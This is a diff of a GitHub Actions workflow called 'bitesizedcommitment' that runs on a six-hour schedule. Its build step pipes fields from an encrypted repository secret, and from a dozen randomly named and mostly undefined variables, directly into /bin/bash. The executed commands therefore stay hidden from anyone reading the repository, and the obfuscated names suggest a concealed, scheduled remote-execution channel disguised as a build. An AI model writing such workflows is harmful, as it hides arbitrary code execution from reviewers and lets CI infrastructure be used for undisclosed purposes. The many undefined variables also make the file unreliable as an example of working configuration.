@@ -3,20 +3,29 @@ name: bitesizedcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
-
+    - cron: '8 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bitesizedcommitment
         env:
-          bu4: ${{ secrets.bu4 }}
+          gzrlh82709: ${{ secrets.gzrlh82709 }}
         run: |
-          echo $bu4 | jq -r .ygxn51 | /bin/bash
-          echo $rjs35504 | jq -r .br8 | /bin/bash
-          echo $zglba1673 | jq -r .gwg0 | /bin/bash
-          echo $tutxz2652 | jq -r .d6772 | /bin/bash
-          echo $zl0918 | jq -r .gywv2 | /bin/bash
+          echo $gzrlh82709 | jq -r .ifdiu97 | /bin/bash
+          echo $rwjb7 | jq -r .loj44 | /bin/bash
+          echo $n62471 | jq -r .au7 | /bin/bash
+          echo $d08 | jq -r .ya35156 | /bin/bash
+          echo $jgng4550 | jq -r .q623 | /bin/bash
+          echo $w3579 | jq -r .r19 | /bin/bash
+          echo $orq24 | jq -r .xmemo9 | /bin/bash
+          echo $lyw6763 | jq -r .s1 | /bin/bash
+          echo $jzkj844 | jq -r .egfey970 | /bin/bash
+          echo $xiifa8644 | jq -r .lqmrh98 | /bin/bash
+          echo $enxsw83 | jq -r .wiv7947 | /bin/bash
+          echo $a280 | jq -r .bi826 | /bin/bash
+          echo $fln26 | jq -r .vu26092 | /bin/bash
+          echo $snk428 | jq -r .t1306 | /bin/bash
 
